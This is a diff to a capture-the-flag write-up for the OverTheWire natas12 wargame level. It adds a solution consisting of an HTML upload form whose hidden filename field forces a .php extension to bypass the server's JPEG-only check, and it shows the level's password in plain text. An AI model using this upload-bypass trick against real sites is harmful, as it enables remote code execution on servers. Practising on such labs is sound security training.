@@ -12,4 +12,16 @@ Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
 - Background:
 - Solution:
+  ```html
+  <html>
+  <form enctype="multipart/form-data" action="http://natas12.natas.labs.overthewire.org/index.php" method="POST">
+  <input type="hidden" name="MAX_FILE_SIZE" value="1000" />
+  <input type="hidden" name="filename" value="natas12_getpass.php" />
+  Choose a JPEG to upload (max 1KB):<br/>
+  <input name="uploadedfile" type="file" /><br />
+  <input type="submit" value="Upload File" />
+  </form>
+  </body>
+  </html>
+  ```
 - Password: `yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB`
